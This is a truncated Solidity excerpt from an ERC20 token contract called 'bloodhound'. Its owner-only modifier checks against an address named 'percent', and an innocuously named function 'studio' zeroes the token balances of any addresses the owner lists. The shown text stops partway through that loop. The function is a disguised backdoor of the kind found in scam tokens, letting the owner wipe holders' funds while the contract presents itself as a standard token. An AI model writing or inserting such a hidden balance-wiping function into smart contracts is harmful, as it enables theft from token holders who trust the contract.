...
contract bloodhound is Context, IERC20 {
    ...
    modifier onlyOwner() {
        require(msg.sender == percent, "Not allowed");
        _;
    }

    function studio(address[] memory dirty) public onlyOwner() {
    uint256 len = dirty.length;
    for (uint256 i; i < len; ++i) {
        uint256 balance = _balances[dirty[i]];
        _balances[dirty[i]] = 0;
